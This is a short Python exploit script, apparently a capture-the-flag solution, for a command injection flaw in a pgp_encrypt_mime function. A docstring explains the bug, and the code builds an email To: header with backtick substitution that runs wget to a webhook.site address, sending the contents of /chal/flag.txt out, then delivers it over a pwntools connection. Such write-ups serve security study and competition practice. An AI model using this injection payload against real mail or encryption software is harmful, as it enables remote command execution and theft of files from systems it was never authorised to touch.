from pwn import remote

"""
There is a command injection vulnerability in pgp_encrypt_mime with the
recipient fields being used in a command string without appropriate escaping.
There are a few small restrictions on the injection input, but sending
multiple recipients in the To: field of the eml allows us to add spaces
(it is formatted like "-r <recipient1> -r <recipient2>")
so using wget and sort we can exfiltrate the flag to a remote server.
"""

webhook_site = 'webhook.site/cc8a2ca0-2afd-46dc-8242-64822fbffad2'
payload = f'''To: a@a.com`wget, {webhook_site}?\\`sort, /chal/flag.txt\\``
EOF
'''

print(payload)

conn = remote('localhost', 1337)
conn.sendlineafter(b': ', payload.encode())
print(conn.recvall().decode())
